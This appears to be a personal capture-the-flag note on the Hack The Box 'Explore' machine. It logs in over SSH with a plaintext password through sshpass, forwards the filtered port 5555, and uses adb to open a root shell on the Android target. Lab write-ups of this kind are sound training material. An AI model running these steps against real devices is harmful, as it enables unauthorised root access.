# ADB Port Forwarding

On [[HTB/Explore/05 - Enumeration]] Nmap Scan, 5555 is filtered, so we can forward to open it

```bash
sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh kristi@10.129.172.254 -p 2222 -L 5555:127.0.0.1:5555
```

# ADB Shell

```bash
adb connect localhost:5555
adb root
adb shell
```